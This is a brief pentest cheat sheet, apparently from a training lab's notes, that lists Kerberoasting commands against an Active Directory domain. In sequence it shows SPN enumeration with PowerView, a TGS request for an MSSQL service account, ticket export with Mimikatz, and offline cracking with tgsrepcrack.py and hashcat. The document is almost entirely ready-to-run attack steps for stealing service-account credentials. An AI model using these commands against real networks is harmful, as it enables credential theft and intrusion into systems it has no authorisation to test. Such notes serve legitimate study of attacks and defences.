# 🟢 Kerberoast

### **Find user accounts used as service accounts**

```
. ./GetUserSPNs.ps1
```

```
Get-NetUser -SPN
```

```
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```



### **Reguest a TGS**

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
```

or

```
Request-SPNTicket "MSSQLSvc/dcorp.dollarycorp.local"
```

### **Export ticket using Mimikatz**

```
Invoke-Mimikatz -Command '"Kerberos::list /export"'
```

### **Crack the ticket**

Crack the password for the service account

```
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student1@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

```
.\hashcat.exe -m 18200 -a 0 <HASH FILE> <WORDLIST>
```

<table data-card-size="large" data-view="cards" data-full-width="true"><thead><tr><th></th><th></th><th></th><th data-hidden data-card-cover data-type="files"></th></tr></thead><tbody><tr><td></td><td></td><td></td><td><a href="../.gitbook/assets/Kerberoasting.png">Kerberoasting.png</a></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table>
